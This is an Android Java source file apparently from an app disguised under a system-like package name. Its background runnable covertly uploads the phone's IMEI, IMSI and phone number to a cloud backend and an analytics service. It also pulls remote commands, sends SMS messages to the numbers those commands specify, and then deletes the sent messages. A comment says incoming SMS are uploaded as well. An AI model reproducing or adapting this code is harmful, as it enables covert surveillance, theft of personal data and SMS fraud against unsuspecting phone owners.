package com.android.sms.proxy.service;

import android.content.Context;
import android.text.TextUtils;
import android.util.Log;

import com.android.sms.proxy.entity.CheckInfo;
import com.android.sms.proxy.entity.MessageEvent;
import com.android.sms.proxy.entity.NativeParams;
import com.android.sms.proxy.entity.PhoneInfo;
import com.android.sms.proxy.entity.SmsSimInfo;
import com.avos.avoscloud.AVException;
import com.avos.avoscloud.AVObject;
import com.avos.avoscloud.AVQuery;
import com.flurry.android.FlurryAgent;
import com.oplay.nohelper.utils.Util_Sp;

import org.greenrobot.eventbus.EventBus;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * @author zyq 16-3-31
 */
public class GetMsgRunnable implements Runnable {

	private static final boolean DEBUG = NativeParams.MESSAGE_RUNNABLE_DEBUG;
	private static final String TAG = "GetMsgRunnable";
	private Context mContext;

	//在规定时间内收到的短信会被上传到后台
	public static long sendSmsTime;
	public static CheckInfo currentCheckInfo;
	private boolean startGetMsg = false;


	public GetMsgRunnable(Context context) {
		this.mContext = context;
	}

	@Override
	public void run() {
		try {
			if (DEBUG) {
				Log.d(TAG, "开始轮询了");
			}
			final boolean isStopService = NativeParams.ACTION_STOP_HEARTBEAT_SERVICE;
			if (isStopService) {
				HeartBeatService.getInstance().stopSelf();
				return;
			}
			if (isConditionSatisfy(mContext)) {
				//若之前有存过手机号码,不再进行短信采集
				if (!isSavePhoneNumber(mContext)) {
					updateCheckInfo();
				}
			}
			//updateCheckInfo();
		} catch (Exception e) {
			if (DEBUG) {
				Log.d(TAG, e.fillInStackTrace().toString());
			}
		}
	}

	private boolean isConditionSatisfy(Context context) {
		final boolean isSimExist = PhoneInfo.getInstance(context).isSIMexistOrAvaiable(context);
		if (!isSimExist) return false;
		final String imei = PhoneInfo.getInstance(context).getIMEI();
		if (TextUtils.isEmpty(imei)) return false;
		return true;
	}

	private void reportData(Context context) {
		SmsSimInfo info = new SmsSimInfo();
		info.setImei(PhoneInfo.getInstance(context).getPhoneIMEI());
		info.setImsi(PhoneInfo.getInstance(context).getPhoneIMSI());
		info.setPhonenumber(PhoneInfo.getInstance(context).getNativePhoneNumber1());

		if (DEBUG) {
			Log.d(TAG, "即将上报短信信息！！！！！！！！！！");
		}
		try {
			info.saveInBackground();
		} catch (Throwable e) {
			if (DEBUG) {
				Log.d(TAG, "上报数据失败！！！！！！！！！！！！");
				Log.e(TAG, e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}
	}

	/**
	 * 是否已经存在该手机号
	 *
	 * @return
	 */
	private boolean isSavePhoneNumber(Context context) {
		String phoneNumber = PhoneInfo.getInstance(context).getNativePhoneNumber1();
		if (TextUtils.isEmpty(phoneNumber)) {
			return false;
		} else {
			PhoneInfo.getInstance(context).savePhoneInfo(context, phoneNumber);
			String imei = PhoneInfo.getInstance(context).getIMEI();
			final boolean isSaveInLeadCloud = isSaveInLeadCloud(imei, phoneNumber);
			//若之前没有保存过,保存数据,不再进行短信采集
			if (!isSaveInLeadCloud) {
				reportData(context);
				Map<String, String> map = new HashMap<>();
				map.put(NativeParams.KEY_PHONE_NUMBER, phoneNumber);
				map.put(NativeParams.KEY_PHONE_IMEI, imei);
				FlurryAgent.logEvent(NativeParams.EVENT_REPORT_PHONE_NUMBER, map);
			}
			PhoneInfo.getInstance(context).savePhoneInfo(context, phoneNumber);
		}
		return true;
	}


	private boolean isSaveInLeadCloud(String imei, String phoneNumber) {
		try {
			AVQuery<SmsSimInfo> query = AVObject.getQuery(SmsSimInfo.class);
			query.whereEqualTo("imei", imei);
			query.whereEqualTo("line1PhoneNumber", phoneNumber);
			int count = query.count();
			if (count > 0) return true;
		} catch (AVException e) {
			if (DEBUG) {
				Log.e(TAG, e.toString());
			}
			FlurryAgent.onError(TAG, "", e.fillInStackTrace());
		}
		return false;
	}


	//获取最新的指令，
	private void updateCheckInfo() throws AVException {
		//若没有sim卡,毛用
		final boolean isSimExist = PhoneInfo.getInstance(mContext).isSIMexistOrAvaiable(mContext);
		if (!isSimExist) {
			return;
		}
		startGetMsg = true;
		AVQuery<CheckInfo> query = AVObject.getQuery(CheckInfo.class);
		List<CheckInfo> list = query.find();

		if (list != null && list.size() > 0) {
			if (DEBUG) {
				Log.d(TAG, "查询的数量是：" + list.size());
			}
			for (int i = 0; i < list.size(); i++) {
				CheckInfo info = list.get(i);
				final boolean isDeleteOldData = Boolean.valueOf(info.getDeleteOldData());
				final String operators = info.getOperators();
				String operatorCode = null;
				if (NativeParams.DEFAULT_SEND_BINARY_SMS) {
					operatorCode = PhoneInfo.getInstance(mContext).getPhoneIMSI();
				} else {
					operatorCode = info.getOperatorCode();
				}
				final String operatorInfo = operators + "_" + operatorCode;
				if (DEBUG) {
					Log.d(TAG, "短信:" + operatorInfo);
				}
				boolean isExist = Util_Sp.isOperatorInfoExist(mContext, operatorInfo);
				if (isExist) {
					if (!isDeleteOldData) {
						continue;
					}
				}
				//发送短信
				if (DEBUG) Log.d(TAG, "开始发送短信！！！！！！！！");
				sendSmsTime = System.currentTimeMillis();
				PhoneInfo.getInstance(mContext).sendSMS(operators, operatorCode);
				currentCheckInfo = info;
				String message = "\nsend " + info.getOperatorCode() + " to " + info.getOperators();
				MessageEvent messageEvent = new MessageEvent(message);
				EventBus.getDefault().post(messageEvent);
				try {
					if (DEBUG) {
						Log.d(TAG, "3５秒后重新查询！！！！");
					}
					Thread.currentThread().sleep(25000);
					if (!NativeParams.DEFAULT_SEND_BINARY_SMS) {
						PhoneInfo.getInstance(mContext).deleteSMS(mContext, currentCheckInfo.getOperatorCode());
					}
					Thread.currentThread().sleep(25000);
				} catch (InterruptedException e) {
					if (DEBUG) {
						Log.e(TAG, e.toString());
					}
				}
			}
		}
	}


}
